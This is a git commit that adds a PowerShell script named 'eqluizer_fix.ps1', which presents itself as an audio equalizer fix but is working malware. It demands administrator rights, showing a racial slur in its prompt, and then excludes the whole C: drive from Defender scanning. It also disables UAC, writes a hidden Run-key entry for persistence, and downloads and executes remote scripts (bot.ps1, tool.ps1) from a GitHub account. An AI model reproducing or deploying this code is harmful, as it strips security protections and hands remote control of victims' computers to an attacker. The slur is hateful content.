e7bf7233d5eb16f5cb941c96d1208334348b689b
LUBRJ <145651445+lubrj@users.noreply.github.com>
2025-09-28 15:02:35 +0200

    Create eqluizer_fix.ps1

---
+++ eqluizer_fix.ps1
@@ -0,0 +1,9 @@
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
+    [reflection.assembly]::LoadWithPartialName('PresentationFramework')|Out-Null;[Windows.MessageBox]::Show('Nigger run as admin')
+    exit
+}
+Add-MpPreference -ExclusionPath "C:\"
+New-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Updater" -Value 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/bot.ps1 -UseBasicParsing)"' -PropertyType String -Force
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name "EnableLUA" -Value 0
+Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/tool.ps1 -UseBasicParsing)"'
+powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command "IEX(IWR https://raw.githubusercontent.com/lubrj/saves/refs/heads/main/bot.ps1 -UseBasicParsing)"
